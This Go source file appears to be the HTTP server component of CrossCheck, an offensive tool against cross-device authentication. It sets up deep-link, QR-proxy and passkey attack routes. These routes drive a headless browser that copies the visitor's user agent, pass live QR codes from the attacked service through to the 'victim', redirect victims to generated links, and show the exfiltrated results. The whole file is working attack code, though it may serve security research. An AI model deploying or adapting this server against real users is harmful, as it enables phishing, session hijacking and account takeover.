package httphandler

import (
	"log"
	"net/http"
	"text/template"

	"github.com/Splinter0/CrossCheck/attacks"
	"github.com/chromedp/chromedp"
)

// Results of attacks storage (cleaned after displaying it to the victim)
var attackResults map[string]attacks.AttackResult = map[string]attacks.AttackResult{}

func LaunchAttacks(atcks []attacks.Attack, qrAttacks []attacks.QrProxyAttack, passkeyAttacks []attacks.PasskeyAttack) {
	if attacks.Attach {
		attacks.StartAttachedSession()
	}
	indexTmpl, err := template.ParseFiles("templates/index.html")
	if err != nil {
		log.Fatal("Could not load index template page", err)
		return
	}
	attackTmpl, err := template.ParseFiles("templates/redirect.html")
	if err != nil {
		log.Fatal("Could not load attack template page", err)
		return
	}
	log.Println("Deep link attacks enabled:")
	var urls []string
	for _, a := range atcks {
		attack := a
		url := "/" + attack.Type.Name + attack.Path
		urls = append(urls, url)
		log.Println(url)

		// Upon visit run attack steps
		http.HandleFunc(url, func(w http.ResponseWriter, r *http.Request) {
			log.Printf("%s - %s", r.RemoteAddr, attack.Path)
			comm := make(chan attacks.AttackResult, 1)

			if attack.MimicUserAgent {
				attack.CustomBrowserFlags = append(
					attack.CustomBrowserFlags,
					chromedp.UserAgent(r.UserAgent()),
				)
			}

			go attacks.Visit(&attack, comm) // Run attack steps

			result := <-comm
			cookie := http.Cookie{
				Name:     "result",
				Value:    result.Id,
				Path:     "/",
				HttpOnly: true,
				Secure:   false,
			}
			http.SetCookie(w, &cookie)
			attackResults[result.Id] = result

			if attack.RedirectURL != "" {
				// If we want to do a background redirection, render the page
				attackTmpl.Execute(w, struct {
					TagretLink string
					DeepLink   string
					AwayTime   int
				}{
					TagretLink: attack.RedirectURL,
					DeepLink:   result.DeepLink,
					AwayTime:   5000,
				})
			} else {
				// Otherwise simply redirect to the deep link
				http.Redirect(w, r, result.DeepLink, http.StatusTemporaryRedirect)
			}
		})
	}

	qrTmpl, err := template.ParseFiles("templates/qr.html")
	if err != nil {
		log.Fatal("Could not load attack template page for qr", err)
		return
	}

	prefix := "/qr-proxy"
	var qrUrls []string
	log.Println("QR attacks enabled:")
	for _, a := range qrAttacks {
		attack := a
		url := prefix + attack.Path
		log.Println(url)
		qrUrls = append(qrUrls, url)
		qrUrl := url + "/qr"
		comm := make(chan []byte)
		http.HandleFunc(url, func(w http.ResponseWriter, r *http.Request) {
			log.Printf("%s - %s", r.RemoteAddr, attack.Path)

			// Used to track results, not the QR code images
			result := attacks.NewAttackResult("")

			go attacks.QrProxyVisit(&attack, &comm, result) // Run attack steps

			cookie := http.Cookie{
				Name:     "result",
				Value:    result.Id,
				Path:     "/",
				HttpOnly: true,
				Secure:   false,
			}
			http.SetCookie(w, &cookie)
			attackResults[result.Id] = result

			qrTmpl.Execute(w, struct {
				Qr string
			}{
				Qr: qrUrl,
			})
		})

		http.HandleFunc(qrUrl, func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "image/png")
			img := <-comm
			w.Write(img)
		})
	}

	// Handle passkeys attacks
	prefix = "/passkey"
	var passkeyUrls []string
	for _, a := range passkeyAttacks {
		attack := a
		url := prefix + attack.Path
		log.Println(url)
		passkeyUrls = append(passkeyUrls, url)

		// Upon visit run attack steps
		http.HandleFunc(url, func(w http.ResponseWriter, r *http.Request) {
			log.Printf("%s - %s", r.RemoteAddr, attack.Path)
			comm := make(chan string, 1)

			go attacks.PasskeyVisit(&attack, comm) // Run attack steps

			result := <-comm
			attackTmpl.Execute(w, struct {
				TagretLink string
				DeepLink   string
				AwayTime   int
			}{
				TagretLink: attack.Url,
				DeepLink:   result,
				AwayTime:   5000,
			})
		})
	}

	// Index page simply lists the attacks selected
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// If an attack was carried out with a result, show it
		var result string
		v, err := r.Cookie("result")
		if err == nil {
			if res, ok := attackResults[v.Value]; ok {
				result = <-res.ExfilChannel
				delete(attackResults, v.Value)
			}
		}

		indexTmpl.Execute(w, struct {
			Attacks        []string
			QrAttacks      []string
			PasskeyAttacks []string
			Result         string
		}{
			Attacks:        urls,
			QrAttacks:      qrUrls,
			PasskeyAttacks: passkeyUrls,
			Result:         result,
		})
	})

	http.HandleFunc("/apple", func(w http.ResponseWriter, r *http.Request) {
		appleTmpl, err := template.ParseFiles("templates/apple.html")
		if err != nil {
			log.Fatal("Could not load apple template page", err)
			return
		}
		appleTmpl.Execute(w, []interface{}{})
	})

	err = http.ListenAndServe("0.0.0.0:8000", nil)
	if err != nil {
		log.Fatal(err)
	}
}
